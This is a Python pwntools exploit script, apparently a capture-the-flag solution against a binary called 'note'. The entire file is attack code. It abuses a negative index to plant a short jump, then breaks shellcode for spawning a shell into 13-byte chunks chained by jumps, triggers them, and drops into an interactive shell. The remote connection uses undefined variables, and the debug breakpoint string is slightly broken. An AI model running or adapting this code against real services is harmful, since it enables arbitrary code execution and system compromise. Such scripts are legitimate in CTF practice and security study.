from pwn import *
import sys
import time
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./note")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./note")
else:
	p = remote(ip,addr)

def add(index,payload,content):
	p.sendline(str(1).ljust(0xA-1,"\x00"))
	p.sendline(str(index))
	p.sendline(payload)
	p.send(content.rjust(0xd,"\x90"))

code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b2}\nb *{b2}".format(b1=hex(code_base+0x12FA),b2=hex(code_base+0x1716)))

context.arch = "amd64"
p.recvuntil("404 not found                 \n")
code1 = "jmp $+21"
context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
payload = str(13).ljust(0x12-0x8,"\x00") + p32(-13&0xffffffff)
add(0,payload,asm(code1))

code = shellcraft.sh()
index = 1
length = len(asm(code1))
content = ""
#debugf()
for c in code.split("\n"):
	c_len = len(asm(c))
	if c_len + len(content) + length < 0xd:
		content += asm(c)
	else:
		content += asm(code1)
		add(index,str(0xd),content)
		index += 1
		content = "" + asm(c)
content += asm(code1)
add(index,str(0xd),content)

p.sendline("6")
p.interactive()
